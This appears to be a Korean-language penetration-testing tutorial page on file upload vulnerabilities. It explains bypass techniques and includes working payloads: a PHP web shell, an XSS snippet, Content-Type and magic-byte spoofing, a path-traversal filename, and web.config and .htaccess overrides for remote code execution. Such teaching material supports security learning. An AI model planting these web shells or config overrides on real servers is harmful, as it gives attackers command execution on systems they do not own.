---
title: File Upload Vulnerability
layout: default
parent: Web Penetration Test
nav_order: 2.5
description: "Web hacking"
---

# File Upload Vulnerability (파일 업로드 취약점)

{: .no_toc }

## Table of Contents
{: .no_toc .text-delta }

1. TOC
{:toc}

## What is file upload vulnerability (파일 업로드 취약점이란)

파일 업로드 취약점이란, 웹 서버에서 사용자가 파일을 업로드할때, 파일의 이름, 타입, 내용, 사이즈 등 다양한 정보들을 점검을 안하고 서버에 저장을 할때, 업로드 취약점이 발생 합니다.

웹서버에서 보통 위험한 파일 타입, 속성들을 막지만 이러한 설정을 똑바로 하지않으면 타입 같은경우, 여러 파일타입을 같이 넣어서 웹서버에 혼동을 줄수도 있고, 속성 같은경우, 웹 프록시로 수정하여 우회 할수도 있을것 입니다. 

## What is the impact of file upload vulnerablity (파일 업로드 취약점의 임팩트)

서버가 마비되거나, Remote Command Execution (RCE), 파일 업로드를 트로이젠으로 쓴다거나, 등 같은 다양한 크리티컬한 취약점을 발생 시킬수 있습니다. 

## How web servers handle request for static files (웹 서버에서 Static File의 대한 핸들링)

- Non Executable File (실행이 불가능한 파일): 웹 서버에서 파일 컨텐츠를 HTTP Resposne로 그냥 보낼수 있습니다. 이러한 경우, 웹 서버에서 해당 파일을 읽게되는 경우 Stored XSS 취약점이 발생 할 수 있습니다.


{: .important-title }
> Proof of Concept
> {: .label .label-blue }
>```
><html>
><script>alert("NO FILTER?")
></html>
>```

- Executable File (실행이 가능한 파일): 웹 서버에서 해당 파일 컨텐츠를 실행이 가능하게 시켰을 경우, 서버는 스크립트를 실행하기 전에 HTTP 요청의 헤더와 파라미터를 기반으로 변수를 할당합니다. 그 결과로 생성된 출력물은 HTTP 응답으로 클라이언트에게 전송 될수 있습니다.

{: .important-title }
> Proof of Concept
> {: .label .label-blue }
>```
><?php echo system($_GET['cmd']); ?>
>```

위의 POC경우, `?cmd=` 파라미터로 해당 코드를 실행 할수 있을것 입니다.

- Executable File (실행이 가능한 파일): 웹 서버에서 파일을 실행하도록 설정이 안되어 있다면, 일반적으로 Error로 응답합니다. 하지만 경우에 따라서 파일이 Plain Text로 클라이언트에게 그대로 전송되게 할수 있습니다.


## Bypassing file type validation (파일 타입 우회)

보통 파일 업로드를 진행을 할때, `Content-Type` 헤더가 들어갑니다. 이러한 헤더는 웹 서버에게 "MIME" 타입을 알려주는 역할을 하게 됩니다. 그러면 웹서버가 `Content-Type` 헤더를 보고 예측되는 "MIME" 타입이 맞게 되면 파일 업로드를 허용합니다.

허나 문제가 발생하는 경우는 웹서버가 파일의 실제 내용을 점검을 안하고 오로지 "MIME" 타입과 `Content-Type` 매칭을 보고 판단을 할경우 `Content-Type`을 바꿔서 해당 필터링을 우회 할 수 있습니다. 

{: .important-title }
> Proof of Concept
> {: .label .label-blue }
>```
>Content-Type: image/jpeg 
>```

### Magic Byte bypass (매직바이트 우회)

Magic Byte(매직 바이트)는 File Signature처럼 앞에 처음 몇몇 바이트가 파일타입을 인식하는데 쓰이는것을 의미합니다.

매직바이트를 확인할려면 다음과 같은 명령어를 써볼수 있습니다.

```
file website.jpg # 파일 타입 확인 명령어
xxd website.jpg | head # 헥스데이터 명령어
```

여러 매직바이트들이 파일타입들에 따라 존재하게 되는데 다음과 같이 `.txt`파일을 `GIF87a`라는 매직바이트를 앞에 넣어서 사진파일로 인식시킬수 있습니다.

```
echo -n -e 'GIF87a' > file.txt
```
## File Upload from in user accessible directory (파일 업로드 위치 우회)

웹서버에서 악성파일 업로드를 성공적으로 업로드를 했다 하여도, 여러 문제점들이 아직 남아있을수 있습니다.

1. 업로드한 파일이 실행이 가능한가?
2. 업로드한 파일의 PATH를 아는가?

이러한 것들을 확인하기 위해서는 확실히 알아야될 것은 업로드가 되는 파일의 PATH를 알아야된다는 것입니다.

이러한 우회로 파일업로드를 할때, `filename` 에서 Path Traversal 공격을 시도해 볼수 있습니다. 

```
Content-Disposition: form-data; name="avatar"; filename="../../../../../../../wwwroot/exploit.php"
```
웹사이트를 돌아다니면서 찾은 PATH들로 Path Traversal공격을 시도할수 있을것 입니다.

## Overriding the Server Configuration (서버 설정 파일을 업로드해서 우회)

앞서 말했다 싶이 웹 서버는 해당 파일을 실행하게 설정이 되지 않는이상 파일을 실행시키진 않습니다. 예를들어서 아파치 서버에 `.php` 파일을 사용자의 요청에 따라 실행하고 싶을 경우 `/etc/apache2/apache2.conf` 파일에 다음과 같은 설정을 했을것입니다.

```
LoadModule php_module /usr/lib/apache2/modules/libphp.so
    AddType application/x-httpd-php .php
```

이러한 설정 파일 같이 여러 config파일들을 업로드해서 웹서버가 파일을 실행시키거나 config 파일 자체에서 악성 코드를 실행 시킬수 있게도 할 수 있습니다.

### web.config RCE

Proof of Concept:

```html
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Response.write("-"&"->")
' it is running the ASP code if you can see 3 by opening the web.config file!
Dim oShell, sCommand
sCommand = ""
Set oShell = Server.CreateObject("WScript.Shell")
oShell.Run sCommand, , True
Set oShell = Nothing
Response.write("<!-"&"-")
%>
-->
```
### .htaccess RCE 

`.htaccess` 는 아파치 웹 서버 디렉토리를 설정하는 기본적인 파일입니다. 만약 웹서버에 `.htaccess`를 Override 할 수 있다면, 다음과 같은 공격들을 수행 할수 있습니다.

1. `AddType application/x-httpd-php .txt`를 `.htaccess` 파일을 올려 덮어씌운다음 `webshell.txt`등으로 `txt`파일을 업로드 하였지만 php로 실행시킬수 있을것 입니다.

2. `php_flag engine off`를 사용할 경우, 엔진을 종료시켜 php코드가 유출이 됩니다.

## Reference
1. https://kangsecu.tistory.com/99
